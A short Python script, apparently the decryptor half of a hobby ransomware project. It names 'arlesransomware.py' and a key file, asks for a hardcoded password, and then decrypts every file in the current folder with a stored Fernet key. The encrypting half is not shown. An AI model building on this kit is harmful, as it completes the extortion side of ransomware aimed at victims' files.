import os
from cryptography.fernet import Fernet
files = []
for file in os.listdir():
    if file == "arlesransomware.py" or file == "thekey.key" or file == "decoder.py":
            continue
    if os.path.isfile(file):
        files.append(file)
print(files)

with open("thekey.key","rb") as key:
        secretkey = key.read()


secretpass = "senkimseyisevemezsin"

user_pass = input("Enter the secret pass to decrypt your files \n")

if user_pass == secretpass:
	for file in files:
		with open(file , "rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)
		print("Congrats you're files are decrypted.")
else:
	print("This is not true pass")
